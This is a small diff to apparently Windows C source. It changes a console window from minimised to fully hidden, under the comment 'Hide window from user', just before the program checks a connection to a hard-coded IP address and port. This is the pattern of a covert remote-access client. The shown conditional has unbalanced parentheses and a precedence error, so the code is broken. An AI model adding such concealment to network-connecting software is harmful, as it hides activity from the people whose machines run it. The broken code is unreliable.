@@ -41,7 +41,7 @@ int main(int argc, char* argv[]) {
 	// Hide window from user...
 
 	HANDLE consoleWindow = GetConsoleWindow();
-	ShowWindow(consoleWindow, SW_FORCEMINIMIZE);
+	ShowWindow(consoleWindow, SW_HIDE);
 
 	// Check that we can actually get to the host.
 	if((rv = getaddrinfo(IPADDR, PORT, &hints, &servinfo) != 0) {
